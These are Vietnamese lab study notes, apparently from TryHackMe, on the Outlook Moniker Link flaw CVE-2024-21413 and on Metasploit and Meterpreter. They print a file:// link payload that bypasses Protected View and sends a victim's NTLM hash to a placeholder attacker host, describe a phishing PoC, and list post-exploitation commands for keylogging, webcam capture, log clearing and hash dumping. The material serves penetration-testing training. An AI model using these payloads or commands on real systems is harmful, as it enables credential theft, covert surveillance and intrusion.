# Liên kết Moniker (CVE-2024-21413)

Outlook có thể hiển thị email dưới dạng HTML. Bạn có thể nhận thấy điều này được sử dụng bởi các bản tin yêu thích của bạn. Ngoài ra, Outlook có thể phân tích cú pháp các siêu liên kết như HTTP và HTTPS. Tuy nhiên, nó cũng có thể mở các URL chỉ định các ứng dụng được gọi là Moniker Links .  Thông thường, Outlook sẽ nhắc nhở cảnh báo bảo mật khi các ứng dụng bên ngoài được kích hoạt.



Cửa sổ bật lên này là kết quả của tính năng "Protected View" của Outlook. Protect View sẽ mở các email chứa tệp đính kèm, siêu liên kết và nội dung tương tự ở chế độ chỉ đọc, chặn các nội dung như macro (đặc biệt là từ bên ngoài tổ chức).



Bằng cách sử dụng **file://** Moniker Link trong siêu liên kết, chúng ta có thể hướng dẫn Outlook thử truy cập một tệp, chẳng hạn như tệp trên chia sẻ mạng (**<a href="file://ATTACKER\\\\\\\_IP/test">Click me</a>**). Giao thức SMB được sử dụng, bao gồm việc sử dụng thông tin xác thực cục bộ để xác thực.  Tuy nhiên, chế độ "Protected View" của Outlook sẽ phát hiện và chặn nỗ lực này.

**<p><a href="file://ATTACKER\\\\\\\_MACHINE/test">Click me</a></p>**



Lỗ hổng ở đây tồn tại bằng cách sửa đổi siêu liên kết của chúng tôi để bao gồm !ký tự đặc biệt và một số văn bản trong Moniker Link, dẫn đến việc bỏ qua chế độ Protected View của Outlook. Ví dụ: **<a href="file://ATTACKER\\\\\\\_IP/test!exploit">Click me</a>**.

**<p><a href="file://ATTACKER\\\\\\\_MACHINE/test!exploit">Click me</a></p>**



Với tư cách là kẻ tấn công, chúng ta có thể cung cấp một Liên kết Moniker có tính chất này cho cuộc tấn công. Lưu ý rằng việc chia sẻ không nhất thiết phải tồn tại trên thiết bị từ xa, vì dù sao thì một nỗ lực xác thực vẫn sẽ được thực hiện, dẫn đến việc mã băm netNTLMv2 Windows của nạn nhân được gửi đến kẻ tấn công.



Thực thi Mã Từ xa ( RCE ) là khả thi vì Moniker Links sử dụng Mô hình Đối tượng Thành phần (COM) trên Windows. Tuy nhiên, việc giải thích điều này hiện nằm ngoài phạm vi của phòng này, vì không có bằng chứng khái niệm nào được công bố công khai về việc đạt được RCE thông qua CVE cụ thể này .



##### Khai thác :

Với cuộc tấn công này, chúng tôi sẽ gửi email cho nạn nhân một Liên kết Moniker tương tự như liên kết được cung cấp trong nhiệm vụ trước. Mục tiêu của kẻ tấn công là tạo một email gửi đến nạn nhân với Liên kết Moniker để vượt qua chế độ "Protected View" của Outlook, nơi máy khách của nạn nhân sẽ cố gắng tải một tệp từ máy tính tấn công của chúng tôi, dẫn đến việc mã băm netNTLMv2 của nạn nhân bị bắt.



Nhưng trước tiên, hãy cùng xem qua PoC mà tôi đã tạo (cũng có sẵn trên GitHub(**https://github.com/CMNatic/CVE-2024-21413**)).



PoC :​

* Lấy email của kẻ tấn công và nạn nhân. Thông thường, bạn sẽ cần sử dụng máy chủ SMTP của riêng mình (máy chủ này đã được cung cấp sẵn cho bạn trong phòng này).
* Yêu cầu mật khẩu để xác thực. Đối với phòng này, mật khẩu cho attacker@monikerlink.thm là attacker
* Chứa nội dung email (html\_content), trong đó có Liên kết Moniker của chúng tôi dưới dạng siêu liên kết HTML
* Sau đó, điền vào các trường "chủ đề", "từ" và "đến" trong email
* Cuối cùng, nó gửi email đến máy chủ thư



Hãy sử dụng Responder để tạo một trình lắng nghe SMB trên máy tấn công của chúng ta. Đối với THM AttackBox, giao diện sẽ là -I ens5. Tên giao diện sẽ khác nếu bạn sử dụng thiết bị của riêng mình (ví dụ: Kali). Nếu bạn muốn tìm hiểu thêm, máy chủ Impacket cũng có thể được sử dụng.

Chúng ta hãy mở máy dễ bị tấn công bằng cách nhấn vào ngăn " CVE -2024-21413" trong chế độ xem màn hình chia đôi.

Mở Outlook bằng cách nhấp vào biểu tượng "Outlook" trên màn hình nền. Khi Outlook đã mở, hãy nhấp vào "Tôi không muốn đăng nhập hoặc tạo tài khoản" trên cửa sổ bật lên.

Đóng cửa sổ bật lên thứ hai bằng cách nhấp vào "X" ở góc trên bên phải của cửa sổ bật lên (bạn có thể cần kéo cửa sổ sang trái một chút, tùy thuộc vào độ phân giải màn hình).

Khi hoàn tất, bạn sẽ thấy giao diện Outlook. Đối với phòng này, hộp thư của nạn nhân đã được thiết lập sẵn trong Outlook cho bạn.

Quay lại AttackBox của bạn. Chúng tôi sẽ sao chép và dán PoC ở trên vào AttackBox.

Chúng ta sẽ cần thực hiện một số thiết lập ban đầu trên AttackBox trước khi chạy tập lệnh Python:

* Sửa đổi Moniker Link (dòng #12) trong PoC của chúng tôi để phản ánh địa chỉ IP của AttackBox của chúng tôi
* Thay thế chỗ giữ chỗ MAILSERVER ở dòng #31 bằng MACHINE\_IP
* Khi hoàn tất, chúng ta có thể chạy lệnh khai thác. Khi được yêu cầu nhập mật khẩu email của kẻ tấn công, hãy nhập "attacker".

Khi hoàn tất, chúng ta có thể chạy lệnh khai thác. Khi được yêu cầu nhập mật khẩu email của kẻ tấn công, hãy nhập "attacker".

Tập lệnh Python sẽ in ra "Email đã gửi" khi email đã được gửi. Nếu tập lệnh báo lỗi xác thực, hãy đảm bảo bạn đã thay thế chính xác các giá trị trong exploit.py. Bây giờ, hãy quay lại máy tính bị tấn công và kiểm tra email mới.

Nhấp vào siêu liên kết "Nhấp vào tôi" và quay lại phiên đầu cuối "Responder" của chúng tôi trên AttackBox.



#### Phát hiện :

**YARA**

Florian Roth đã tạo ra quy tắc Yara(**https://github.com/Neo23x0/signature-base/blob/master/yara/expl\_outlook\_cve\_2024\_21413.yar**) để phát hiện các email có chứa thành phần trong Moniker Link.file:\\\\



**Wireshark**

Ngoài ra, yêu cầu SMB từ nạn nhân đến máy khách có thể được nhìn thấy trong gói tin bắt được với hàm băm netNTLMv2 bị cắt bớt.



# Metasploit: Giới thiệu

#### Giới thiệu về Metasploit :

Metasploit là nền tảng khai thác được sử dụng rộng rãi nhất. Metasploit là một công cụ mạnh mẽ có thể hỗ trợ tất cả các giai đoạn của quá trình kiểm tra xâm nhập, từ thu thập thông tin đến hậu khai thác.



Metasploit có hai phiên bản chính:

* Metasploit Pro : Phiên bản thương mại hỗ trợ tự động hóa và quản lý tác vụ. Phiên bản này có giao diện người dùng đồ họa ( GUI ).
* Metasploit Framework : Phiên bản mã nguồn mở hoạt động từ dòng lệnh. Bài viết này sẽ tập trung vào phiên bản này, được cài đặt trên AttackBox và là phiên bản kiểm tra xâm nhập phổ biến nhất trên các bản phân phối Linux .



Metasploit Framework là một bộ công cụ cho phép thu thập thông tin, quét, khai thác, phát triển khai thác, hậu khai thác, v.v. Mặc dù mục đích sử dụng chính của Metasploit Framework tập trung vào lĩnh vực kiểm tra xâm nhập, nhưng nó cũng hữu ích cho việc nghiên cứu lỗ hổng và phát triển khai thác.



Các thành phần chính của Metasploit Framework có thể được tóm tắt như sau;

* msfconsole : Giao diện dòng lệnh chính.
* Mô-đun : hỗ trợ các mô-đun như khai thác, máy quét, tải trọng, v.v.
* Công cụ : Các công cụ độc lập hỗ trợ nghiên cứu lỗ hổng, đánh giá lỗ hổng hoặc kiểm tra thâm nhập. Một số công cụ này bao gồm msfvenom, pattern\_create và pattern\_offset. Chúng tôi sẽ đề cập đến msfvenom trong mô-đun này, nhưng pattern\_create và pattern\_offset là những công cụ hữu ích trong việc phát triển khai thác, nằm ngoài phạm vi của mô-đun này.



#### Các thành phần chính của Metasploit :

Khi sử dụng Metasploit Framework, bạn chủ yếu sẽ tương tác với bảng điều khiển Metasploit . Bạn có thể khởi chạy nó từ terminal AttackBox bằng  msfconsole lệnh. Bảng điều khiển sẽ là giao diện chính để bạn tương tác với các mô-đun khác nhau của Metasploit Framework. Mô-đun là các thành phần nhỏ trong Metasploit Framework, được xây dựng để thực hiện một tác vụ cụ thể, chẳng hạn như khai thác lỗ hổng, quét mục tiêu hoặc thực hiện tấn công brute-force.



Trước khi đi sâu vào các mô-đun, sẽ hữu ích nếu làm rõ một số khái niệm thường gặp: lỗ hổng, khai thác và tải trọng.



Khai thác: Một đoạn mã sử dụng lỗ hổng hiện có trên hệ thống mục tiêu.

Lỗ hổng bảo mật: Một lỗi thiết kế, mã hóa hoặc logic ảnh hưởng đến hệ thống mục tiêu. Việc khai thác lỗ hổng bảo mật có thể dẫn đến việc tiết lộ thông tin mật hoặc cho phép kẻ tấn công thực thi mã trên hệ thống mục tiêu.

Payload: Một khai thác sẽ lợi dụng lỗ hổng. Tuy nhiên, nếu muốn khai thác đạt được kết quả mong muốn (truy cập hệ thống mục tiêu, đọc thông tin mật, v.v.), chúng ta cần sử dụng một payload. Payload là mã sẽ chạy trên hệ thống mục tiêu.

Các mô-đun và danh mục của từng mô-đun được liệt kê bên dưới. Những mô-đun này chỉ mang tính chất tham khảo, nhưng bạn sẽ tương tác với chúng thông qua bảng điều khiển Metasploit (msfconsole).



###### Phụ trợ(Auxiliary)



###### Bộ mã hóa(Encoders)

Bộ mã hóa sẽ cho phép bạn mã hóa phần khai thác và phần tải trọng với hy vọng rằng giải pháp chống vi-rút dựa trên chữ ký có thể bỏ sót chúng.

Các giải pháp bảo mật và chống vi-rút dựa trên chữ ký có cơ sở dữ liệu về các mối đe dọa đã biết. Chúng phát hiện mối đe dọa bằng cách so sánh các tệp đáng ngờ với cơ sở dữ liệu này và đưa ra cảnh báo nếu có sự trùng khớp. Do đó, bộ mã hóa có thể có tỷ lệ thành công hạn chế vì các giải pháp chống vi-rút có thể thực hiện các kiểm tra bổ sung.



###### Trốn tránh(Evasion)

Mặc dù bộ mã hóa sẽ mã hóa dữ liệu, chúng không nên được coi là một nỗ lực trực tiếp nhằm tránh né phần mềm diệt vi-rút. Mặt khác, các mô-đun "trốn tránh" sẽ cố gắng làm điều đó, với ít nhiều thành công.



###### Khai thác(Exploits)

Các lỗ hổng được sắp xếp gọn gàng theo hệ thống mục tiêu.



###### NOPs

NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.



###### Tải trọng(Payloads)

Payloads are codes that will run on the target system.

Exploits will leverage a vulnerability on the target system, but to achieve the desired result, we will need a payload. Examples could be; getting a shell, loading a malware or backdoor to the target system, running a command, or launching calc.exe as a proof of concept to add to the penetration test report. Starting the calculator on the target system remotely by launching the calc.exe application is a benign way to show that we can run commands on the target system.

Running command on the target system is already an important step but having an interactive connection that allows you to type commands that will be executed on the target system is better. Such an interactive command line is called a "shell". Metasploit offers the ability to send different payloads that can open shells on the target system.

Bạn sẽ thấy bốn thư mục khác nhau trong phần tải trọng: bộ điều hợp, đơn, giai đoạn và giai đoạn.

* Bộ điều hợp(Adapters): Bộ điều hợp đóng gói các payload đơn lẻ để chuyển đổi chúng sang các định dạng khác nhau. Ví dụ: một payload đơn lẻ thông thường có thể được đóng gói bên trong một bộ điều hợp Powershell , bộ điều hợp này sẽ tạo ra một lệnh Powershell duy nhất để thực thi payload.
* Đơn lẻ(Singles): Các tải trọng độc lập (thêm người dùng, khởi chạy notepad.exe, v.v.) không cần tải xuống thành phần bổ sung để chạy.
* Stagers: Chịu trách nhiệm thiết lập kênh kết nối giữa Metasploit và hệ thống đích. Hữu ích khi làm việc với các payload được dàn dựng. "Staged payload" sẽ tải một stager lên hệ thống đích trước, sau đó tải xuống phần còn lại của payload (giai đoạn). Điều này mang lại một số lợi thế vì kích thước ban đầu của payload sẽ tương đối nhỏ so với toàn bộ payload được gửi cùng lúc.
* Giai đoạn(Stages): Được tải xuống bởi trình phân đoạn. Điều này sẽ cho phép bạn sử dụng các tải trọng có kích thước lớn hơn.

Metasploit có một cách tinh tế giúp bạn xác định các tải trọng đơn lẻ (còn gọi là "nội tuyến") và các tải trọng theo giai đoạn.

* generic/shell\_reverse\_tcp
* windows/x64/shell/reverse\_tcp

Cả hai đều là shell Windows đảo ngược. Shell trước là một payload nội tuyến (hoặc đơn), được biểu thị bằng dấu “\_” giữa “shell” và “reverse”. Trong khi shell sau là payload theo giai đoạn, được biểu thị bằng dấu “/” giữa “shell” và “reverse”.



###### Bưu kiện(POST)

Các mô-đun bài đăng sẽ hữu ích ở giai đoạn cuối cùng của quá trình kiểm tra xâm nhập được liệt kê ở trên, sau khi khai thác.



#### Msfconsole :

**🔎 1. Tìm Kiếm \& Lựa Chọn Module**

Đây là những lệnh bạn sẽ dùng đầu tiên để tìm "vũ khí" phù hợp cho mục tiêu.



**search \[từ\_khóa]**

* Công dụng: Lệnh quan trọng nhất để tìm kiếm các module (exploit, auxiliary, payload, etc.) trong kho dữ liệu của Metasploit.
* Mẹo: Bạn có thể tìm theo tên lỗ hổng (ví dụ: ms17-010), tên phần mềm (wordpress), hoặc loại module (type:exploit platform:windows).
* Ví dụ: search eternalblue



**use \[tên\_module]**

* Công dụng: Chọn một module để bắt đầu sử dụng. Bạn có thể dùng tên đầy đủ hoặc số thứ tự từ kết quả lệnh search.
* Ví dụ: use exploit/windows/smb/ms17\_010\_eternalblue



**info**

* Công dụng: Sau khi use một module, lệnh này sẽ hiển thị tất cả thông tin chi tiết về nó: tác giả, mô tả lỗ hổng, các mục tiêu tương thích, và các tùy chọn cần thiết lập.



**back**

* Công dụng: Thoát khỏi module hiện tại và quay trở lại giao diện dòng lệnh chính của msfconsole.



**⚙️ 2. Cấu Hình \& Chạy Module**

Sau khi chọn được module, bạn cần "nạp đạn" cho nó.



**show options (hoặc options)**

* Công dụng: Liệt kê tất cả các tùy chọn bạn cần phải thiết lập cho module đã chọn. Hãy đặc biệt chú ý đến những mục có "yes" ở cột Required.



**set \[TÊN\_TÙY\_CHỌN] \[giá\_trị]**

* Công dụng: Thiết lập một giá trị cho một tùy chọn cụ thể.
* Ví dụ quan trọng:

set RHOSTS 192.168.1.10: Đặt địa chỉ IP của máy mục tiêu. (RHOSTS = Remote Hosts)

set LHOST 10.10.0.5: Đặt địa chỉ IP của máy bạn. (LHOST = Local Host). Lệnh này cực kỳ quan trọng khi dùng các payload reverse shell.



**setg \[TÊN\_TÙY\_CHỌN] \[giá\_trị]**

* Công dụng: Tương tự như set, nhưng nó sẽ thiết lập giá trị đó một cách toàn cục (globally). Bạn sẽ không cần phải đặt lại giá trị này khi chuyển sang một module khác (ví dụ: setg LHOST tun0).



**show payloads**

* Công dụng: Liệt kê tất cả các payloads tương thích với module exploit bạn đang dùng.



**set payload \[tên\_payload]**

* Công dụng: Chọn một payload cụ thể để sử dụng sau khi khai thác thành công.
* Ví dụ: set payload windows/x64/meterpreter/reverse\_tcp



**run (hoặc exploit)**

* Công dụng: Chạy module sau khi đã thiết lập xong tất cả các tùy chọn cần thiết.



**🐚 3. Tương Tác Với Session (Sau Khi Tấn Công Thành Công)**

Khi đã chiếm được quyền điều khiển, bạn cần các lệnh này để quản lý kết nối.



**sessions**

* Công dụng: Liệt kê tất cả các phiên (session) đang hoạt động mà bạn có.



**sessions -i \[ID]**

* Công dụng: Tương tác và nhảy vào một session cụ thể. ID là con số bạn thấy từ lệnh sessions.
* Ví dụ: sessions -i 1



**background**

* Công dụng: Đưa session hiện tại chạy ở chế độ nền để bạn quay lại msfconsole và làm việc khác (ví dụ: tấn công một máy khác). Bạn có thể quay lại session này bất cứ lúc nào bằng sessions -i.
* Phím tắt: Ctrl + Z cũng có tác dụng tương tự.



**🚀 4. Các Lệnh Meterpreter Phổ Biến**

Khi bạn đã ở bên trong một session Meterpreter, đây không còn là lệnh của msfconsole nữa, mà là các lệnh của chính Meterpreter để tương tác với máy nạn nhân.

* **sysinfo** : Lấy thông tin hệ thống của máy nạn nhân.
* **getuid** : Cho biết bạn đang là người dùng (user) nào trên hệ thống đó.
* **ps** : Liệt kê các tiến trình đang chạy.
* **migrate \[PID]** : Di chuyển Meterpreter vào một tiến trình khác (ví dụ explorer.exe) để che giấu và duy trì kết nối.
* **upload \[file\_của\_bạn]** : Tải file từ máy bạn lên máy nạn nhân.
* **download \[file\_trên\_máy\_nạn\_nhân]** : Tải file từ máy nạn nhân về máy bạn.
* **shell** : Mở một giao diện dòng lệnh (shell) cơ bản của hệ điều hành nạn nhân.
* **getsystem** : Cố gắng leo thang đặc quyền lên mức cao nhất (SYSTEM trên Windows).

# 

# Metasploit: Khai thác

#### Quét :

###### **Quét cổng**

Metasploit có một số mô-đun để quét các cổng mở trên hệ thống và mạng đích. Bạn có thể liệt kê các mô-đun quét cổng tiềm năng bằng search portscan lệnh.

Các mô-đun quét cổng sẽ yêu cầu bạn thiết lập một số tùy chọn:

* ĐỒNG THỜI(CONCURRENCY): Số lượng mục tiêu được quét đồng thời.
* CỔNG(PORTS): Phạm vi cổng cần quét. Xin lưu ý rằng phạm vi 1-1000 ở đây sẽ không giống với phạm vi sử dụng Nmap với cấu hình mặc định. Nmap sẽ quét 1000 cổng được sử dụng nhiều nhất, trong khi Metasploit sẽ quét số cổng từ 1 đến 10000.
* RHOSTS: Mục tiêu hoặc mạng mục tiêu cần quét.
* CHỦ ĐỀ(THREAD): Số luồng sẽ được sử dụng đồng thời. Nhiều luồng hơn sẽ giúp quét nhanh hơn.



Bạn có thể trực tiếp thực hiện quét Nmap từ dấu nhắc msfconsole



###### **Nhận dạng dịch vụ UDP**

Mô-đun này **scanner/discovery/udp\_sweep** sẽ cho phép bạn nhanh chóng xác định các dịch vụ đang chạy trên UDP (Giao thức dữ liệu người dùng). Như bạn có thể thấy bên dưới, mô-đun này sẽ không quét toàn bộ tất cả các dịch vụ UDP có thể có nhưng cung cấp một cách nhanh chóng để xác định các dịch vụ như DNS hoặc NetBIOS .



###### **Quét SMB**

Metasploit cung cấp một số mô-đun bổ trợ hữu ích cho phép chúng ta quét các dịch vụ cụ thể. Dưới đây là một ví dụ dành cho doanh nghiệp vừa và nhỏ (SMB) . Đặc biệt hữu ích trong mạng doanh nghiệp smb\_enumshares , smb\_version nhưng hãy dành thời gian để xác định các trình quét mà phiên bản Metasploit được cài đặt trên hệ thống của bạn cung cấp.



#### Cơ sở dữ liệu Metasploit :

Việc kết nối Metasploit với một cơ sở dữ liệu (thường là PostgreSQL) mang lại nhiều lợi ích lớn:

* Quản lý tập trung: Tất cả thông tin về mục tiêu—như địa chỉ IP, các cổng đang mở, dịch vụ đang chạy, và các lỗ hổng đã phát hiện—đều được lưu trữ ở một nơi.
* Tăng tốc độ: Việc tìm kiếm và lọc thông tin trong database nhanh hơn rất nhiều so với việc quét lại từ đầu.
* Tự động hóa: Nhiều module của Metasploit có thể tự động lấy thông tin từ database để điền vào các tùy chọn (ví dụ: tự động lấy RHOSTS từ danh sách máy chủ đã quét).
* Lưu trữ bằng chứng: Bạn có thể lưu lại "loot" (dữ liệu chiếm được như password hash, file nhạy cảm) và các thông tin quan trọng khác.



###### **Các Lệnh Cơ Bản và Quan Trọng ⚙️**

Đây là những lệnh bạn sẽ sử dụng thường xuyên nhất khi làm việc với database trong msfconsole.



1\. Lệnh Quản Lý Kết Nối

**db\_status**

* Công dụng: Kiểm tra trạng thái kết nối tới cơ sở dữ liệu. Đây là lệnh đầu tiên bạn nên chạy để xem Metasploit đã kết nối database hay chưa.
* Ví dụ: msf6 > db\_status

\[\*] postgresql connected to msf (Đã kết nối thành công)



**db\_connect**

* Công dụng: Dùng để kết nối thủ công tới một database. (Thông thường trên Kali Linux, việc này đã được cấu hình sẵn).



**db\_disconnect**

* Công dụng: Ngắt kết nối khỏi database hiện tại.



2\. Lệnh Quản Lý Không Gian Làm Việc (Workspace)

Workspace cho phép bạn chia nhỏ các dự án pentest. Mỗi workspace là một database riêng biệt, giúp bạn không bị lẫn lộn thông tin giữa các mục tiêu khác nhau.



**workspace**

* Công dụng: Liệt kê tất cả các workspace hiện có. Workspace đang hoạt động sẽ có dấu \* bên cạnh.
* Ví dụ: msf6 > workspace



**workspace -a \[tên\_workspace]**

* Công dụng: Thêm (-a for add) một workspace mới.
* Ví dụ: msf6 > workspace -a tryhackme\_project



**workspace \[tên\_workspace]**

* Công dụng: Chuyển sang một workspace khác.
* Ví dụ: msf6 > workspace tryhackme\_project



3\. Lệnh Tương Tác Với Dữ Liệu

Đây là các lệnh dùng để nhập và xem dữ liệu đã thu thập.



**db\_nmap \[các\_tùy\_chọn\_của\_Nmap]**

* Công dụng: Chạy Nmap ngay từ trong Metasploit và tự động lưu kết quả vào database. Đây là cách tốt nhất để bắt đầu thu thập thông tin.
* Ví dụ: msf6 > db\_nmap -sV -A 10.10.123.45



**hosts**

* Công dụng: Liệt kê tất cả các máy chủ (hosts) đã được phát hiện và lưu trong workspace hiện tại.
* Ví dụ: msf6 > hosts



**services**

* Công dụng: Liệt kê tất cả các dịch vụ và cổng đang mở trên các máy chủ đã quét.
* Ví dụ: msf6 > services



**vulns**

* Công dụng: Liệt kê các lỗ hổng tiềm năng đã được phát hiện (thường là từ các module scanner).
* Ví dụ: msf6 > vulns



**loot**

* Công dụng: Hiển thị các dữ liệu quan trọng (mật khẩu, hash, key,...) mà bạn đã chiếm được và lưu lại.
* Ví dụ: msf6 > loot



#### Payloads

**## Payload: "Hàng Hóa" Được Gửi Tới Mục Tiêu 📦**

Payload là đoạn mã sẽ được thực thi trên máy nạn nhân sau khi lỗ hổng đã được khai thác thành công. Mục tiêu của exploit là để chạy được payload.

Metasploit chia Payloads thành các loại khác nhau, nhưng bạn chỉ cần tập trung vào 2 loại chính là Staged (Theo Giai Đoạn) và Stageless (Độc Lập).



**## 1. Stageless Payloads (Payload Độc Lập / Inline)**

Đặc điểm: Toàn bộ payload nằm trong một khối duy nhất. Nó chứa tất cả mọi thứ cần thiết để hoạt động ngay lập tức.

Ưu điểm:

Ổn định: Vì chỉ có một kết nối duy nhất nên nó đáng tin cậy hơn.



Nhược điểm:

Kích thước lớn: Dễ bị các hệ thống phòng thủ phát hiện và chặn lại vì kích thước file lớn và bất thường.



Khi nào dùng: Khi bạn không quá lo lắng về việc bị phát hiện, hoặc khi mục tiêu có kết nối mạng không ổn định.



Tên gọi: Thường có từ \_inline hoặc không có dấu gạch chéo ở giữa tên (ví dụ windows/x64/shell\_reverse\_tcp).



**## 2. Staged Payloads (Payload Theo Giai Đoạn) - Quan Trọng \& Phổ Biến Nhất!**

Đây là loại payload được sử dụng nhiều nhất và là cách hoạt động mặc định của Meterpreter. Nó hoạt động theo 2 bước:

Stager (Người Giao Hàng): Một đoạn mã cực kỳ nhỏ và đơn giản được gửi đi trước. Nhiệm vụ duy nhất của nó là đột nhập vào máy nạn nhân, thiết lập một kênh kết nối về máy của bạn, sau đó "gọi điện về nhà" để yêu cầu gửi phần còn lại.



Stage (Gói Hàng Lớn): Sau khi Stager kết nối thành công, máy của bạn sẽ gửi đi phần payload chính (Stage), ví dụ như toàn bộ Meterpreter.



Ưu điểm:

Tàng hình: Stager rất nhỏ nên có khả năng cao vượt qua được các hệ thống phòng thủ (IDS/IPS/Antivirus).

Linh hoạt: Bạn có thể dễ dàng thay đổi Stage mà không cần thay đổi exploit.



Nhược điểm:

Phụ thuộc kết nối: Cần nhiều kết nối nên đôi khi không ổn định.



Tên gọi: Tên của chúng thường có dấu gạch chéo / để phân tách Stager và Stage.



**## Giải Mã Tên Gọi Của Payload**

Hiểu được cách đặt tên sẽ giúp bạn chọn payload cực nhanh. Ví dụ: windows/x64/meterpreter/reverse\_tcp

windows: Hệ điều hành mục tiêu.

x64: Kiến trúc CPU (x64 hoặc x86).

meterpreter: Đây là Stage (phần payload chính sẽ được tải về).

reverse\_tcp: Đây là Stager. Nó cho biết cách Stager sẽ kết nối.

reverse\_tcp: Máy nạn nhân chủ động kết nối về máy của bạn. Đây là lựa chọn phổ biến nhất vì nó có thể vượt qua tường lửa.

bind\_tcp: Máy của bạn chủ động kết nối tới máy nạn nhân. Cách này ít dùng hơn vì thường bị tường lửa của mục tiêu chặn lại.



#### Meterpreter

###### **## Meterpreter Là Gì? 🚀**

Meterpreter là một "shell" nâng cao, cho phép bạn điều khiển máy nạn nhân một cách mạnh mẽ và kín đáo sau khi đã khai thác thành công. Nó không phải là một command prompt (cmd) hay bash shell thông thường.



###### **## Tại Sao Meterpreter Lại Đặc Biệt?**

Nó vượt trội hơn một shell thông thường ở rất nhiều điểm:

* Hoạt động hoàn toàn trong bộ nhớ (In-memory): Đây là ưu điểm lớn nhất. Meterpreter được tiêm thẳng vào một tiến trình đang chạy trên máy nạn nhân và không ghi bất kỳ file nào xuống ổ cứng. Điều này giúp nó né tránh hầu hết các phần mềm diệt virus truyền thống, vốn thường quét các file trên đĩa.
* Giao tiếp mã hóa: Mọi lệnh bạn gửi và mọi kết quả trả về giữa máy bạn và máy nạn nhân đều được mã hóa. Điều này khiến các công cụ giám sát mạng (như Wireshark) rất khó phát hiện ra bạn đang làm gì.
* Khả năng mở rộng (Extensible): Meterpreter có cấu trúc module. Bạn có thể tải thêm các phần mở rộng ngay trong session để có thêm tính năng mới mà không cần phải ngắt kết nối. 
* Ví dụ:

stdapi: Các lệnh hệ thống cơ bản (quản lý file, tiến trình).

priv: Các lệnh dùng để leo thang đặc quyền (getsystem).

kiwi: Module Mimikatz nổi tiếng để trích xuất mật khẩu từ bộ nhớ.

* Đa nền tảng: Cùng một giao diện Meterpreter nhưng nó có thể hoạt động trên Windows, Linux, và các hệ điều hành khác, giúp bạn không cần phải học lại lệnh cho từng môi trường.



###### **## Các Lệnh Meterpreter Bạn Phải Biết**

Các lệnh cốt lõi

* background: Bối cảnh của phiên hiện tại
* exit: Kết thúc phiên Meterpreter
* guid: Lấy GUID phiên (Mã định danh duy nhất toàn cầu)
* help: Hiển thị menu trợ giúp
* info: Hiển thị thông tin về mô-đun Post
* irb: Mở một shell Ruby tương tác trên phiên hiện tại
* load: Tải một hoặc nhiều tiện ích mở rộng Meterpreter
* migrate: Cho phép bạn di chuyển Meterpreter sang một tiến trình khác
* run: Thực thi tập lệnh Meterpreter hoặc mô-đun Post
* sessions: Nhanh chóng chuyển sang phiên khác



Lệnh hệ thống tập tin

* cd: Sẽ thay đổi thư mục
* ls: Sẽ liệt kê các tập tin trong thư mục hiện tại (dir cũng sẽ hoạt động)
* pwd: In thư mục làm việc hiện tại
* edit: sẽ cho phép bạn chỉnh sửa một tập tin
* cat: Sẽ hiển thị nội dung của một tập tin trên màn hình
* rm: Sẽ xóa tập tin đã chỉ định
* search: Sẽ tìm kiếm các tập tin
* upload: Sẽ tải lên một tập tin hoặc thư mục
* download: Sẽ tải xuống một tập tin hoặc thư mục



Lệnh mạng

* arp: Hiển thị bộ nhớ đệm ARP (Giao thức phân giải địa chỉ) của máy chủ
* ifconfig: Hiển thị các giao diện mạng có sẵn trên hệ thống đích
* netstat: Hiển thị các kết nối mạng
* portfwd: Chuyển tiếp một cổng cục bộ đến một dịch vụ từ xa
* route: Cho phép bạn xem và sửa đổi bảng định tuyến



Lệnh hệ thống

* clearev: Xóa nhật ký sự kiện
* execute: Thực hiện một lệnh
* getpid: Hiển thị mã định danh quy trình hiện tại
* getuid: Hiển thị cho người dùng rằng Meterpreter đang chạy như
* kill: Kết thúc một tiến trình
* pkill: Kết thúc tiến trình theo tên
* ps: Liệt kê các tiến trình đang chạy
* reboot: Khởi động lại máy tính từ xa
* shell: Thả vào một shell lệnh hệ thống
* shutdown: Tắt máy tính từ xa
* sysinfo: Lấy thông tin về hệ thống từ xa, chẳng hạn như hệ điều hành



Các lệnh khác (các lệnh này sẽ được liệt kê trong các danh mục menu khác nhau trong menu trợ giúp)

* idletime: Trả về số giây người dùng từ xa không hoạt động
* keyscan\_dump: Xóa bộ đệm phím tắt
* keyscan\_start: Bắt đầu ghi lại các lần nhấn phím
* keyscan\_stop: Dừng ghi lại các lần nhấn phím
* screenshare: Cho phép bạn theo dõi màn hình máy tính của người dùng từ xa theo thời gian thực
* screenshot: Chụp ảnh màn hình máy tính để bàn tương tác
* record\_mic: Ghi âm thanh từ micrô mặc định trong X giây
* webcam\_chat: Bắt đầu trò chuyện video
* webcam\_list: Liệt kê các webcam
* webcam\_snap: Chụp ảnh nhanh từ webcam được chỉ định
* webcam\_stream: Phát luồng video từ webcam đã chỉ định
* getsystem: Cố gắng nâng cao đặc quyền của bạn lên ngang bằng với hệ thống địa phương
* hashdump: Đổ nội dung của cơ sở dữ liệu SAM
